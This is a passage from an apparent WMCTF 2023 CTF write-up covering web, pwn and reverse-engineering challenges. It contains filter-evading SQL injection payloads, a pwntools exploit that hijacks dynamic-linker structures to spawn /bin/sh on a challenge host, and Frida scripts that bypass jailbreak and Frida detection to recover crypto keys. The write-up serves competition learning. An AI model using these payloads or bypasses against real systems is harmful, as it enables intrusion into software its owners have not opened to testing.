11. Then the final idea is to write a WebRTC client, pass Server authentication, use the admin identity to establish RTC communication to gain the ability to interact with the `editDatabase`, send the payload over, make the program execute to the query function through a stack overflow, and then construct a SQL injection to look up the table and check for flags. also note the presence of an Anti-injection checking:
   ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713225722.png)
12. Keywords are bypassed using case, spaces are bypassed using comments, and comments are just bypassed using Where.
    Check TablePayload: `xx';SeLeCt/**/*/**/FroM/**/[secret]/**/WhErE/**/id=1||'\x00`
    Check FlagPayload: `xx';SeLeCt/**/*/**/FroM/**/sqlite_master/**/WhErE/**/type/**/=/**/'table'||'\x00`

### blindless

house of blindless方法的利用

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
from ctypes import *
#context.log_level = 'debug'
def write(addr,content):
    content = list(content)
    payload = "@" + p32(addr)
    for i in range(len(content)):
        payload += '.' + p8(ord(content[i]))
        payload += '>'
    return payload
def exp():
    p.recv()
    p.send(str(0x100000))
    p.recv()
    p.send(str(0x100))
    p.recv()
    payload = write(0x33f958 - 0x1c000,"/bin/sh;") #劫持参数
    payload += write(0x340180-0x33f958-0x8,p64(0x9)) #将l_addr改为DT_DEBUg和system函数的差值
    payload += write(0x340228-0x340180-0x8,p8(0x88-0x8)) #劫持DT_FINI指向DT_DEBUG
    payload += write(0x340290-0x340228 - 0x1,p64(0)) #使得DT_FINI_ARRAY为NULL
    payload += 'q'
    p.send(payload)
    p.interactive()
if __name__ == "__main__":
    binary = './main'
    elf = ELF('./main')
    context.binary = binary
    if(len(sys.argv) == 3):
        p = remote(sys.argv[1],sys.argv[2])
    else:
        p = process(binary)
    exp()
```

## Reverse

### gohunt

Symbolic compilation has been retained for ease of problem solving. The questions are compiled using tinygo. Which all strings used base64 encryption to interfere with the analysis.

The jpg is flagged and the QR code is first scanned using a code scanning tool, which gives the encrypted string as

`YMQHsYFQu7kkTqu3Xmt1ruYUDLU8uaMoPpsfjqYF4TQMMKtw5KF7cpWrkWpk3`

This is very much like a base64 or other similar algorithm that allows further analysis of the program. Since the amount of pseudo-code is large, you can start with strings and look for strings that are a bit special.

![image-20230821230440653](https://cdn.ha1c9on.top/img/image-20230821230440653.png)

Based on the debugging and analysis, it can be determined that the location of this block is the modified base58, which is implemented as follows https://blog.csdn.net/jason_cuijiahui/article/details/79280362

![image-20230821230621603](/Users/ha1c9on/W&M/Challege/WMCTF 2023/Reverse/gohunt/解题/Readme.assets/image-20230821230621603.png)

Upward analysis shows that the above is a heteroscedastic algorithm, and the key of the heteroscedastic can be captured in the debugging again.，`NPWrpd1CEJH2QcJ3`

![image-20230822095853716](https://cdn.ha1c9on.top/img/image-20230822095853716.png)

Further up you can find the xxtea symbol information, along with the name of the github repository. After debugging, we can get the key used for encryption as `FMT2ZCEHS6pcfD2R`

![image-20230822095828692](https://cdn.ha1c9on.top/img/image-20230822095828692.png)

Finally get the flag `wmctf{YHNEBJx1WG0cKtZk8e2PNbxJa45WQF09}`

代码详见exp

### ios

Since the IPA file is developed by a personal developer certificate, you need to install it on your jailbroken phone and install the Cydia plugin (AppSync) to block the signature verification, which is relatively basic, so I won't go into details.
 After the successful installation of IPA, the interface is as follows.

![image-20230812172550738](https://cdn.ha1c9on.top/img/image-20230812172550738.png)

At this point any letter entered click verify will find the prompt jailbreak device can not continue, then first need to bypass the jailbreak detection.

![image-20230812172613775](https://cdn.ha1c9on.top/img/image-20230812172613775.png)

There is no doubt that there is a jailbreak detection, in order to bypass the detection, direct installation of a shielded jailbreak detection plug-ins can be used, here I use the **Liberty Lite** plug-in, in the target application using the shielded jailbreak plug-ins, at this time again can be normal to check the input. Into the binary level, here first unpack the IPA file to get the corresponding Mach-O file, and then use the class-dump can be dumped out of the macho file of all the header files

![image-20230812172638801](https://cdn.ha1c9on.top/img/image-20230812172638801.png)

After getting the corresponding ViewController, you can roughly confirm the upper logic part, UIButton corresponds to the check code. Use IDA to open the corresponding MachO file while frida is hooked.
 Hook the popup code for this UI.。

![image-20230812172655144](https://cdn.ha1c9on.top/img/image-20230812172655144.png)

Listens to the [UIAlertView initWithTitle:message:delegate:cancelButtonTitle:otherButtonTitles:] function and prints the call stack

![image-20230812172719533](https://cdn.ha1c9on.top/img/image-20230812172719533.png)

We can find that the upper level caller is -[ViewController handleButtonClick:] function, the corresponding memory address is 0x104e6bb00, and the base address of the main module of the function is 0x104e64000, so the corresponding offset address in IDA should be
 0x104e6bb00-0x104e64000 + 0x100000000 = 0x100007B00.

![image-20230812172759180](https://cdn.ha1c9on.top/img/image-20230812172759180.png)

The pseudo-code of the corresponding address is as above, obviously the string is encrypted, continue to trace the call of the function v48 and find that it is called as follows.

![image-20230812172831589](https://cdn.ha1c9on.top/img/image-20230812172831589.png)

Guessing that this would be the window that would pop up if the flags were correct, a step-by-step upward tracing due to the involvement of ollvm reveals that

![image-20230812172848864](https://cdn.ha1c9on.top/img/image-20230812172848864.png)

sub_1000091e4 should be used to process the input, hook to confirm.

![image-20230812172904356](https://cdn.ha1c9on.top/img/image-20230812172904356.png)

Verify that there is no error, IDA follow up the function, continue to analyze and find that there is a part of the processing of the parameters, where v59 is the input.

![image-20230812172921506](https://cdn.ha1c9on.top/img/image-20230812172921506.png)

The FRIDA hook found v120 to be a fixed value "tfvq29bcom.runig" and the v59 parameter value to be qwe.

![image-20230812172932971](https://cdn.ha1c9on.top/img/image-20230812172932971.png)

Continuing to trace the other parameters reveals that v104 is actually the address of the output![image-20230812172950611](https://cdn.ha1c9on.top/img/image-20230812172950611.png)

And the output and input length are the same static analysis of the sub100004A9C function, found several key points:.

1. key involved in the generation of a v6 array

![image-20230812173015204](https://cdn.ha1c9on.top/img/image-20230812173015204.png)

2. The length of the v6 array should be 255

![image-20230812173034834](https://cdn.ha1c9on.top/img/image-20230812173034834.png)

So guessing its the rc4 algorithm, cyberchef verified it as follows.

![image-20230812173048677](https://cdn.ha1c9on.top/img/image-20230812173048677.png)

Then the normal output should be compared to a preset value, looking for references to v104 based on such a characterization

![image-20230812173104795](https://cdn.ha1c9on.top/img/image-20230812173104795.png)

The corresponding assembly address is at 0x9D84

![image-20230812173117908](https://cdn.ha1c9on.top/img/image-20230812173117908.png)

Go straight to the inline hook and verify that x9 is indeed what is output.

![image-20230812173134858](https://cdn.ha1c9on.top/img/image-20230812173134858.png)

So what is the comparison data to verify that the corresponding x8 register is in memory? Direct inline hook

![image-20230812173201799](https://cdn.ha1c9on.top/img/image-20230812173201799.png)

Verify the RC4.

![image-20230812173213584](https://cdn.ha1c9on.top/img/image-20230812173213584.png)

Is it garbled? What is the length of the data?

![image-20230812173257230](https://cdn.ha1c9on.top/img/image-20230812173257230.png)

You end up with a flag of: wmctf{K3p1n2un#1n9!$#@} 

check 下

![image-20230812173328162](https://cdn.ha1c9on.top/img/image-20230812173328162.png)

### RightBack

#### 0x00 Daily Shell Check

pyc file, check Read to see that it's running under python 3.9.

#### 0x01 Deobfuscation

##### Find Flower

Pyc files are decompiled directly using pycdc, but can be found to report errors directly, so go and observe the python bytecode

![image-20230726153928565](https://cdn.ha1c9on.top/img/image-20230726153928565.png)

It is not difficult to find a large number of flower commands, it may seem as if each flower command is different, but in fact the form is the same, the shape is as follows

```
# JUMP_FORWARD  0       6E 0
# JUMP_FORWARD  4       6E 4
# 4个无意义字节          1 2 3 4   
# JUMP_FORWARD  2       6E 2
# 两个无意义字节         5 6   
# org
```

So we just need to nop all of these to fix it? But after the nop, we can find that the program won't run, and the decompile tool is still not available.

The reason is python's co_lnotab.

1. it's a table of commands and line numbers.
2. Python uses `co_lnotab` to align bytecode to source lines for source debugging.
3. When we change to nop, instructions with arguments become instructions without arguments, which will cause bytecode offsets to be miscalculated.

> https://svn.python.org/projects/python/branches/pep-0384/Objects/lnotab_notes.txt

##### Remove Flower

So I switched to the idea of removing the bytecode of the flower instruction directly, but also taking into account the repair of python's structures, of which the one related to the length of our bytecode is co_code

```
'co_argcount'      # code需要的位置参数个数,不包括变长参数(*args 和 **kwargs)
'co_cellvars'      # code 所用到的 cellvar 的变量名,tuple 类型, 元素是 PyStringObject('s/t/R')
'co_code'          # PyStringObject('s'), code对应的字节码
'co_consts'        # 所有常量组成的 tuple
'co_filename'      # PyStringObject('s'), 此 code 对应的 py 文件名
'co_firstlineno'   # 此 code 对应的 py 文件里的第一行的行号
'co_flags'         # 一些标识位,也在 code.h 里定义,注释很清楚,比如 CO_NOFREE(64) 表示此 PyCodeObject 内无 freevars 和 cellvars 等
'co_freevars'      # code 所用到的 freevar 的变量名,tuple 类型, 元素是 PyStringObject('s/t/R')
'co_lnotab'        # PyStringObject('s'),指令与行号的对应表
'co_name'          # 此 code 的名称
'co_names'         # code 所用的到符号表, tuple 类型,元素是字符串
'co_nlocals'       # code内所有的局部变量的个数,包括所有参数
'co_stacksize'     # code段运行时所需要的最大栈深度
'co_varnames'      # code 所用到的局部变量名, tuple 类型, 元素是 PyStringObject('s/t/R')
```

That is, after modifying the bytecode, at the same time to change the length of the co_code, and according to the python bytecode mechanism, each function will be divided into a code segment, in addition to the flower of each code segment at the same time at the same time to modify the corresponding co_code, but also according to the header of each code segment are 0x73 to read each code segment

```python
def slice_code(code):
    # 记录代码段的 开头 与 长度
    code_attribute = []
    for i in range(len(code)):
        if code[i] == 0x73:
            size = int(struct.unpack("<I", bytes(code[i + 1:i + 5]))[0])
            try:
                if code[size + i + 5 - 2] == 0x53:
                    code_attribute.append({
                        'index': i + 5,
                        'len': size
                    })
            except:
                pass
    # 取出每个代码段    
    code_list = []
    for i in range(len(code_attribute)):
        code_list.append(code[code_attribute[i]['index']: code_attribute[i]['index'] + code_attribute[i]['len']])

    return code_attribute, code_list
```

After reading, you can start to fix the code segment, the points to pay attention to are

1. record the length of the instruction removed to modify the co_code
2. fix the jump statement
3. remove all flower instructions

Since python's jumps are hardcoded in, when we remove the bytes, the whole jump is messed up, so we have to modify each jump statement, which is summarized as follows

```
两类跳转
1. 相对跳转
  1.1 检测当前地址到目标地址中间的cnt
2. 绝对跳转
  2.1 检测起始地址到目标地址之前的cnt
```

Then you can remove the entire file in its entirety by following this line of thought, and the complete code to remove the flower and add the flower code will be uploaded to github at the end of the game.

> https://github.com/PoZeep

#### 0x02 Decryption

Then it is easier to audit the python code after de-obfuscation, all strings are encrypted with RC4, but after recovering the source code, you can directly print out the strings or the required data, and a little auditing reveals that the program is only encrypted by a Have function, which is encrypted by a VM.

![image-20230726161233485](https://cdn.ha1c9on.top/img/image-20230726161233485.png)

And there is source code all the intermediate data can be debugged to obtain the correct opcode, write an interpreter to know what kind of encryption program on the input, of course, the encryption is not very long to analyze directly and manually can also be, and so you can learn the encryption process is as follows

```assembly
init
初始化寄存器

mov ecx, 0												   ; 0x50, 3, 3, 0
add eax, key ecx	eax += key0								; 0x1D, 1, 1, 3	
mov ecx, 1												   ; 0x50, 3, 3, 1
add ebx, key ecx	ebx += key1								; 0x1D, 1, 2, 3



add cnt, 1		循环开始  								; 0x1D, 3, 6, 1
xor eax, ebx	A^B										; 0x71, 1, 2
mov ecx, eax	ecx = A ^ B	 							 ; 0x50, 2, 3, 1
mov r8, ebx		r8 = B									; 0x50, 2, 5, 2
and ebx, 0x1F	B & 0x1F								; 0x72, 2, 0x1F
shl eax, ebx	eax = (A^B) << (B & 0x1F)				  ; 0x29, 1, 2
mov edx, 32												; 0x50, 3, 4, 32
sub edx, ebx	32 - (B & 0x1F)							 ; 0x96, 2, 4, 2
shr ecx, edx	ecx = (A^B) >> (32 - (B & 0x1F))		   ; 0x74, 3, 4
or eax, ecx	A = (A^B) << (B & 0x1F) | (A^B) >> (32 - (B & 0x1F)) ; 0x57, 1, 3
mov ebx, cnt											; 0x50, 2, 2, 6				
mul ebx, 2												; 0xDC, 3, 2, 2
mov ecx, key ebx										; 0x50, 1, 3, 2
add eax, ecx	A += roundkey[2 * i] 					 ; 0x1D, 2, 1, 3


mov ebx, r8											    ; 0x50, 2, 2, 5
xor ebx, eax	B ^ A									; 0x71, 2, 1
mov ecx, ebx	ecx = B ^ A								; 0x50, 2, 3, 2
mov edx, eax											; 0x50, 2, 4, 1
and edx, 0x1F	A & 0x1F								; 0x72, 4, 0x1F
shl ebx, edx	ebx = (B ^ A) << (A & 0x1F)				  ; 0x29, 2, 4
mov r8, 32												; 0x50, 3, 5, 32
sub r8, edx	r8 = 32 - (A & 0x1F)						 ; 0x96, 2, 5, 4
shr ecx, r8												; 0x74, 3, 5
or ebx, ecx	ebx = (B^A) << (A & 0x1F) | (B^A) >> (32 - (A & 0x1F)) ; 0x57, 2, 3
mov ecx, cnt											; 0x50, 2, 3, 6
mul ecx, 2												; 0xDC, 3, 3, 2
add ecx, 1												; 0x1D, 3, 3, 1
mov edx, key ecx										; 0x50, 1, 4, 3
add ebx, edx	B += roundkey[2 * i + 1]				  ; 0x1D, 2, 2, 4

cmp cnt, 21												; 0x7
jnz add cnt, 1
exit														0xFF				
```

#### 0x03 GetFlag

Reduced to C code is not difficult to find that this is a RC5 encryption, the only modification is the number of rounds changed to 21 rounds, the required key in the original program can be printed directly to obtain, so rub out the script

```C
#include <stdio.h>
#include <stdint.h>

#define WORD_SIZE 32
#define KEY_SIZE 16
#define NUM_ROUNDS 21


void RC5_Decrypt(uint32_t *ct, uint32_t *pt, uint32_t *roundKey) {
    uint32_t i;
    uint32_t B = ct[1];
    uint32_t A = ct[0];

    for (i = NUM_ROUNDS; i >= 1; i--) {
        B -= roundKey[2 * i + 1];
        B = (B << (WORD_SIZE - (A & (WORD_SIZE - 1)))) | (B >> (A & (WORD_SIZE - 1)));
        B ^= A;
        A -= roundKey[2 * i];
        A = (A << (WORD_SIZE - (B & (WORD_SIZE - 1)))) | (A >> (B & (WORD_SIZE - 1)));
        A ^= B;
    }

    pt[1] = B - roundKey[1];
    pt[0] = A - roundKey[0];
}


int main() {
    uint32_t ciphertext[] = {0x43af236, 0x56b19afc, 0xf71e21dc, 0xdb8f8e94, 0x4d34e79d, 0x9c520c6e, 0xfbfad5fd, 0x32f9782c, 0xbbbe39c1, 0xd98575b6, 0x28f8cc78, 0xa4e48592, 0xebd72c5, 0xaf87912a, 0x8bf1ef96, 0x1660d112};
    uint32_t roundKey[] = {1835819331, 1853321028, 1768711490, 1432712805, 2177920767, 4020699579, 2261476601, 3551400604, 711874531, 3318306392, 1124217505, 2427199549, 3099853672, 2098025776, 1041196945, 2929936300, 246748610, 1941455090, 1303848803, 3809763535, 1395557789, 546751855, 1830937100, 2385871555, 2516030638, 3043054017, 3628118989, 1450520846, 1825094265, 3651791800, 32069749, 1469868411, 919887482, 4017993154, 4002737591, 3104343244, 4134211933, 420914335, 4152510760, 1317719524, 1990496755, 1873950060, 2553314372, 3602559392};
    int i, j;
    uint32_t flag[16] = { 0 };

	for ( i = 0; i < 8; i++ )
    {
    	RC5_Decrypt(ciphertext + 2 * i, flag + 2 * i, roundKey);
    	if (i != 0)
    	{
    		flag[i * 2] ^= ciphertext[2 * i - 2];
    		flag[i * 2 + 1] ^= ciphertext[2 * i - 1];
		}
		for ( j = 3; j >= 0; j-- )
			printf("%c", (flag[i * 2] >> (j * 8)) & 0xFF);
		for ( j = 3; j >= 0; j-- )
			printf("%c", (flag[i * 2 + 1] >> (j * 8)) & 0xFF);
	}


    return 0;
}
```

Get Flag!

![image-20230726161738691](https://cdn.ha1c9on.top/img/image-20230726161738691.png)

### ezAndroid

Used https://github.com/amimo/goron to do control flow flattening obfuscation and string encryption.

First look at the java layer

![1](https://cdn.ha1c9on.top/img/1.png)

Nothing much, just two checks, one for the username and one for the password, go look at the SO layer

![2](https://cdn.ha1c9on.top/img/2.png)

Nothing in the export table, it should be a dynamic registration, you can try hooking RegisterNatives

``` js
function hook_RegisterNatives(){
    var symbols = Process.getModuleByName('libart.so').enumerateSymbols();
    var RegisterNatives_addr =null;
    for (let i = 0; i < symbols.length; i++) {
        var symbol = symbols[i];
        if (symbol.name.indexOf("RegisterNatives") != -1 && symbol.name.indexOf("CheckJNI") == -1){
            RegisterNatives_addr = symbol.address;
        }
    }
    console.log("RegisterNatives_addr: ", RegisterNatives_addr);
    Interceptor.attach(RegisterNatives_addr,{
        onEnter:function (args) {
            var env = Java.vm.tryGetEnv();
            var className =env.getClassName(args[1]);
            var methodCount = args[3].toInt32();
            for (let i = 0; i < methodCount; i++) {
                var methodName = args[2].add(Process.pointerSize*3*i).add(Process.pointerSize*0).readPointer().readCString();
                var signature = args[2].add(Process.pointerSize*3*i).add(Process.pointerSize*1).readPointer().readCString();
                var fnPtr = 
args[2].add(Process.pointerSize * 3 * i).add(Process.pointerSize * 2).readPointer();
                var module = Process.findModuleByAddress(fnPtr);
                console.log(className, methodName, signature, fnPtr, module.name, fnPtr.sub(module.base));
            }

        },onLeave:function (retval) {
        }
    })
}

hook_RegisterNatives();
```

Got offsets 0x35f0 and 0x3f58, but crashed, suspecting frida detection, more on that later

#### 0x35f0

Analyzing 0x35f0 first, which is checkUsername, there was confusion

![4](https://cdn.ha1c9on.top/img/4.png)

Scrolling down I saw memcmp, suspected to be a comparison of encrypted strings, v30 was found to be v21 by cross-referencing, and finally sub_6C78 was passed in

![5](https://cdn.ha1c9on.top/img/5.png)

Enter 6C78 analysis with rc4 features

![6](https://cdn.ha1c9on.top/img/6.png)

It is possible to try hook sub_6C78 to get some data to test, but there are frida detections that we need to bypass

![7](https://cdn.ha1c9on.top/img/7.png)

The detection function is placed in the init_array segment, sub_3584 is the

![8](https://cdn.ha1c9on.top/img/8.png)

Here the string is encrypted, you can try to decrypt it manually

``` python
a=[  0x16, 0xFA, 0x38, 0x83, 0xCB, 0x17, 0x21, 0xF7, 0x4A, 0x90, 
  0x50, 0x57, 0x99, 0x04, 0x04, 0x6F, 0xB0, 0xD3, 0x97, 0x02, 
  0x47, 0x74, 0x52, 0x73, 0xB6, 0x02, 0xC9, 0x55, 0xEE, 0x39, 
  0x8A, 0x4A, 0xEC, 0xA8, 0x38, 0x52, 0x92, 0x26, 0xF6, 0x7F, 
  0x3A, 0xF8, 0x74, 0x77, 0x6F, 0x24, 0xE3, 0xFB, 0x49, 0x03, 
  0x96, 0xC8, 0x29, 0xA5, 0xDC, 0xB7, 0x29, 0xFB, 0x4D, 0xE6, 
  0x08, 0x83, 0x3B, 0xE6]
s=""
for i in range(15):
      s+=chr(a[i+29]^a[i%0x1d])

print(s)

#/proc/self/maps
```

That is, maps are detected

![9](https://cdn.ha1c9on.top/img/9.png)

Here 7BBC is also the decryption function, you can try to decrypt it manually

``` python
a=[    0x49, 0x94, 0x59, 0x21, 0x9F, 0x14, 0x16, 0xE2, 0x52, 0xB9,
  0x51, 0x49, 0x90, 0xAE, 0x96, 0xBC, 0x2F, 0xE6, 0x30, 0x45,
  0xFE, 0x14]
s=""
for i in range(5):
      s+=chr(a[i+16]^a[i%0x10])

print(s)
#frida
```

So that means that it detects if there is a frida in the maps, you can try the function nop, or use hluda's frida

![10](https://cdn.ha1c9on.top/img/10.png)

Entered a few random strings and found that the hook didn't take effect

![11](https://cdn.ha1c9on.top/img/11.png)

Careful analysis reveals that there is length detection, and of course looking at the length of memcmp gives you the length of the username

``` js
Java.perform(function (){
    var soAddr = Module.findBaseAddress("libezandroid.so");
    let rc4 = soAddr.add(0x6C78);
    Interceptor.attach(rc4,{
        onEnter(args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];
            this.arg3 = args[3];
            this.arg4 = args[4];
            console.log("arg0:",hexdump(this.arg0,{length:parseInt((this.arg2))}));
            console.log("arg1:",hexdump(this.arg1,{length:parseInt((this.arg2))}));
            console.log("arg3:",hexdump(this.arg3,{length:parseInt((this.arg4))}));

        },
        onLeave(retval) {
            console.log("arg0:",hexdump(this.arg0,{length:parseInt((this.arg2))}));
            console.log("arg1:",hexdump(this.arg1,{length:parseInt((this.arg2))}));
            console.log("arg3:",hexdump(this.arg3,{length:parseInt((this.arg4))}));
        }
    })
})
```

![12](https://cdn.ha1c9on.top/img/12.png)

Parameter 1 is our input username, parameter 2 is the encrypted buffer, parameter 3 is the length of the username, parameter 4 is the key, parameter 5 is the length of the key

byte_A148 is the ciphertext, we clicked in and found that there is no, need to cross-reference to see the location of the assignment

![13](https://cdn.ha1c9on.top/img/13.png)

Also in initarray

![14](https://cdn.ha1c9on.top/img/14.png)

Solve it and find out it's not right.

![15](https://cdn.ha1c9on.top/img/15.png)

Careful analysis of rc4, magically altered the final xor, more xor subscripts

```python
a=[0x52,0x64,0x5d,0x32,0x77,0x5a,0x63,0x66,0x5b,0x70]
for i in range(len(a)):
  print(chr(a[i]^i),end="")
#Re_1s_eaSy  
```

Or just patch the input

```js
Java.perform(function (){
    var soAddr = Module.findBaseAddress("libezandroid.so");
    let rc4 = soAddr.add(0x6C78);
    Interceptor.attach(rc4,{
        onEnter(args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];
            this.arg3 = args[3];
            this.arg4 = args[4];

            console.log("arg0:",hexdump(this.arg0,{length:parseInt((this.arg2))}));
            this.arg0.writeByteArray([0xe9,0x97,0x64,0xe6,0x7e,0xeb,0xbd,0xc1,0xab,0x43])
            console.log("arg0:",hexdump(this.arg0,{length:parseInt((this.arg2))}));
            console.log("arg1:",hexdump(this.arg1,{length:parseInt((this.arg2))}));
            console.log("arg3:",hexdump(this.arg3,{length:parseInt((this.arg4))}));

        },
        onLeave(retval) {
            console.log("\r\nonleave")
            console.log("arg0:",hexdump(this.arg0,{length:parseInt((this.arg2))}));
            console.log("arg1:",hexdump(this.arg1,{length:parseInt((this.arg2))}));
            console.log("arg3:",hexdump(this.arg3,{length:parseInt((this.arg4))}));
        }
    })
})
```

![16](https://cdn.ha1c9on.top/img/16.png)

#### 0x3f58

![17](https://cdn.ha1c9on.top/img/17.png)

v20 is from sub_AFC

v21 is from sub_3F0C

![18](https://cdn.ha1c9on.top/img/18.png)

Go in and analyze it to see if it's a string from the java layer.

![19](https://cdn.ha1c9on.top/img/19.png)

```js
function hook_libart() {
    var GetStringUTFChars_addr = null;

    // jni 系统函数都在 libart.so 中
    var module_libart = Process.findModuleByName("libart.so");
    var symbols = module_libart.enumerateSymbols();
    for (var i = 0; i < symbols.length; i++) {
        var name = symbols[i].name;
        if ((name.indexOf("JNI") >= 0)
            && (name.indexOf("CheckJNI") == -1)
            && (name.indexOf("art") >= 0)) {
            if (name.indexOf("GetStringUTFChars") >= 0) {
                console.log(name);
                // 获取到指定 jni 方法地址
                GetStringUTFChars_addr = symbols[i].address;
            }
        }
    }

    Java.perform(function(){
        Interceptor.attach(GetStringUTFChars_addr, {
            onEnter: function(args){
                console.log("native args[1] is :",Java.vm.getEnv().getStringUtfChars(args[1],null).readCString());
            }, onLeave: function(retval){
            }
        })
    })
}
```

![21](https://cdn.ha1c9on.top/img/21.png)

In addition to the username and password passed from the java layer, there is a username+123456, which is most likely the key

Now try to hook sub_AFC

![22](https://cdn.ha1c9on.top/img/22.png)

```js
Java.perform(function (){
    var soAddr = Module.findBaseAddress("libezandroid.so");
    let tmp = soAddr.add(0xAFC);
    Interceptor.attach(tmp,{
        onEnter(args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];

            console.log("arg0:",hexdump(this.arg0));
            console.log("arg2:",hexdump(this.arg2));

        },
        onLeave(retval) {
            console.log("\r\nonleave")
            console.log("arg0:",hexdump(this.arg0));
            console.log("arg2:",hexdump(this.arg2));
        }
    })
})
```

v20, which is parameter 1, is the password we entered, and v21 is the key, obtained by username+123456

With the plugin Findcrypt you can get the aes table.

![23](https://cdn.ha1c9on.top/img/23.png)

Cross-referencing reveals the existence of table swapping operations in AES, also implemented in initarray

![24](https://cdn.ha1c9on.top/img/24.png)

Then extract the table and reverse Sbox

```python
new_s_box = [
    0x29, 0x40, 0x57, 0x6E, 0x85, 0x9C, 0xB3, 0xCA, 0xE1, 0xF8,
    0x0F, 0x26, 0x3D, 0x54, 0x6B, 0x82, 0x99, 0xB0, 0xC7, 0xDE,
    0xF5, 0x0C, 0x23, 0x3A, 0x51, 0x68, 0x7F, 0x96, 0xAD, 0xC4,
    0xDB, 0xF2, 0x09, 0x20, 0x37, 0x4E, 0x65, 0x7C, 0x93, 0xAA,
    0xC1, 0xD8, 0xEF, 0x06, 0x1D, 0x34, 0x4B, 0x62, 0x79, 0x90,
    0xA7, 0xBE, 0xD5, 0xEC, 0x03, 0x1A, 0x31, 0x48, 0x5F, 0x76,
    0x8D, 0xA4, 0xBB, 0xD2, 0xE9, 0x00, 0x17, 0x2E, 0x45, 0x5C,
    0x73, 0x8A, 0xA1, 0xB8, 0xCF, 0xE6, 0xFD, 0x14, 0x2B, 0x42,
    0x59, 0x70, 0x87, 0x9E, 0xB5, 0xCC, 0xE3, 0xFA, 0x11, 0x28,
    0x3F, 0x56, 0x6D, 0x84, 0x9B, 0xB2, 0xC9, 0xE0, 0xF7, 0x0E,
    0x25, 0x3C, 0x53, 0x6A, 0x81, 0x98, 0xAF, 0xC6, 0xDD, 0xF4,
    0x0B, 0x22, 0x39, 0x50, 0x67, 0x7E, 0x95, 0xAC, 0xC3, 0xDA,
    0xF1, 0x08, 0x1F, 0x36, 0x4D, 0x64, 0x7B, 0x92, 0xA9, 0xC0,
    0xD7, 0xEE, 0x05, 0x1C, 0x33, 0x4A, 0x61, 0x78, 0x8F, 0xA6,
    0xBD, 0xD4, 0xEB, 0x02, 0x19, 0x30, 0x47, 0x5E, 0x75, 0x8C,
    0xA3, 0xBA, 0xD1, 0xE8, 0xFF, 0x16, 0x2D, 0x44, 0x5B, 0x72,
    0x89, 0xA0, 0xB7, 0xCE, 0xE5, 0xFC, 0x13, 0x2A, 0x41, 0x58,
    0x6F, 0x86, 0x9D, 0xB4, 0xCB, 0xE2, 0xF9, 0x10, 0x27, 0x3E,
    0x55, 0x6C, 0x83, 0x9A, 0xB1, 0xC8, 0xDF, 0xF6, 0x0D, 0x24,
    0x3B, 0x52, 0x69, 0x80, 0x97, 0xAE, 0xC5, 0xDC, 0xF3, 0x0A,
    0x21, 0x38, 0x4F, 0x66, 0x7D, 0x94, 0xAB, 0xC2, 0xD9, 0xF0,
    0x07, 0x1E, 0x35, 0x4C, 0x63, 0x7A, 0x91, 0xA8, 0xBF, 0xD6,
    0xED, 0x04, 0x1B, 0x32, 0x49, 0x60, 0x77, 0x8E, 0xA5, 0xBC,
    0xD3, 0xEA, 0x01, 0x18, 0x2F, 0x46, 0x5D, 0x74, 0x8B, 0xA2,
    0xB9, 0xD0, 0xE7, 0xFE, 0x15, 0x2C, 0x43, 0x5A, 0x71, 0x88,
    0x9F, 0xB6, 0xCD, 0xE4, 0xFB, 0x12
]
new_contrary_sbox = [0] * 256

for i in range(256):
    line = (new_s_box[i] & 0xf0) >> 4
    rol = new_s_box[i] & 0xf
    new_contrary_sbox[(line * 16) + rol] = i

for i in range(len(new_contrary_sbox)):
    if (i % 16 == 0):
        print('\n')
    print("0x%02X"%new_contrary_sbox[i],end=",")
```

```
0x41,0xE8,0x8F,0x36,0xDD,0x84,0x2B,0xD2,0x79,0x20,0xC7,0x6E,0x15,0xBC,0x63,0x0A,

0xB1,0x58,0xFF,0xA6,0x4D,0xF4,0x9B,0x42,0xE9,0x90,0x37,0xDE,0x85,0x2C,0xD3,0x7A,

0x21,0xC8,0x6F,0x16,0xBD,0x64,0x0B,0xB2,0x59,0x00,0xA7,0x4E,0xF5,0x9C,0x43,0xEA,

0x91,0x38,0xDF,0x86,0x2D,0xD4,0x7B,0x22,0xC9,0x70,0x17,0xBE,0x65,0x0C,0xB3,0x5A,

0x01,0xA8,0x4F,0xF6,0x9D,0x44,0xEB,0x92,0x39,0xE0,0x87,0x2E,0xD5,0x7C,0x23,0xCA,

0x71,0x18,0xBF,0x66,0x0D,0xB4,0x5B,0x02,0xA9,0x50,0xF7,0x9E,0x45,0xEC,0x93,0x3A,

0xE1,0x88,0x2F,0xD6,0x7D,0x24,0xCB,0x72,0x19,0xC0,0x67,0x0E,0xB5,0x5C,0x03,0xAA,

0x51,0xF8,0x9F,0x46,0xED,0x94,0x3B,0xE2,0x89,0x30,0xD7,0x7E,0x25,0xCC,0x73,0x1A,

0xC1,0x68,0x0F,0xB6,0x5D,0x04,0xAB,0x52,0xF9,0xA0,0x47,0xEE,0x95,0x3C,0xE3,0x8A,

0x31,0xD8,0x7F,0x26,0xCD,0x74,0x1B,0xC2,0x69,0x10,0xB7,0x5E,0x05,0xAC,0x53,0xFA,

0xA1,0x48,0xEF,0x96,0x3D,0xE4,0x8B,0x32,0xD9,0x80,0x27,0xCE,0x75,0x1C,0xC3,0x6A,

0x11,0xB8,0x5F,0x06,0xAD,0x54,0xFB,0xA2,0x49,0xF0,0x97,0x3E,0xE5,0x8C,0x33,0xDA,

0x81,0x28,0xCF,0x76,0x1D,0xC4,0x6B,0x12,0xB9,0x60,0x07,0xAE,0x55,0xFC,0xA3,0x4A,

0xF1,0x98,0x3F,0xE6,0x8D,0x34,0xDB,0x82,0x29,0xD0,0x77,0x1E,0xC5,0x6C,0x13,0xBA,

0x61,0x08,0xAF,0x56,0xFD,0xA4,0x4B,0xF2,0x99,0x40,0xE7,0x8E,0x35,0xDC,0x83,0x2A,

0xD1,0x78,0x1F,0xC6,0x6D,0x14,0xBB,0x62,0x09,0xB0,0x57,0xFE,0xA5,0x4C,0xF3,0x9A
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * S盒
 */
static const int S[16][16] = {
   0x29, 0x40, 0x57, 0x6E, 0x85, 0x9C, 0xB3, 0xCA, 0xE1, 0xF8,
    0x0F, 0x26, 0x3D, 0x54, 0x6B, 0x82, 0x99, 0xB0, 0xC7, 0xDE,
